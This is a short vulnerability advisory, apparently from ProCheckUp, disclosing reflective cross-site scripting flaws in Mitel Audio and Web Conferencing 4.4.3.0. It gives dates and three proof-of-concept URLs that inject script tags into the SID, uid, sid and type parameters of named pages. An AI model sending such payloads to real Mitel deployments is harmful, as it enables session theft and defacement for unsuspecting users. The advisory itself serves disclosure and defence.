PR10-15: Multiple XSS flaws within Mitel's AWC (Mitel Audio and Web
Conferencing)

Vulnerability found: 21st July 2010

Vendor informed:  26th July 2010

Vulnerability fixed:

Severity: High

Description:

Mitel Audio and Web Conferencing (AWC) are a simple, cost-effective and
scalable audio and web conferencing solution supporting up to 200 ports.
 ProCheckUp has discovered that multiple Mitel Audio and Web
Conferencing pages are vulnerable to reflective XSS attacks.

Version: 4.4.3.0    - http://www.mitel.com/DocController?documentId=26451

1) The following demonstrate the reflective XSS flaws

https://target-domain.foo/wd/wdinvite.asp?SID='><script>alert(1)</script>

https://target-domain.foo/wd/connect.asp?mode=joinmeeting&uid='><script>alert(1)</script>&sid='><script>alert(1)</script>

https://target-domain.foo/wd/applets/Error.asp?type=</span><script>alert(1)</script>


Consequences:
An attacker may be able to cause execution of malicious scripting code
in the browser of a user who clicks on a link to Mitel Audio and Web
Conferencing based site. Such code would run within the security context
of the target domain. This type of attack can result in non-persistent
defacement of the target site, or the redirection of confidential
information (i.e.: session IDs) to unauthorised third parties.
